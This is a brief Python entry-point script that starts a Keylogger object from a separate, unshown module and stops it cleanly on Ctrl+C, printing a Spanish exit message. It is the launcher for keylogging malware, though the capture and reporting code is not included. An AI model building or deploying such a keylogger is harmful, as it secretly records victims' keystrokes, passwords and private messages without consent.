#!/usr/bin/env python3

from keylogger import Keylogger
from termcolor import colored
import signal, sys


def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()

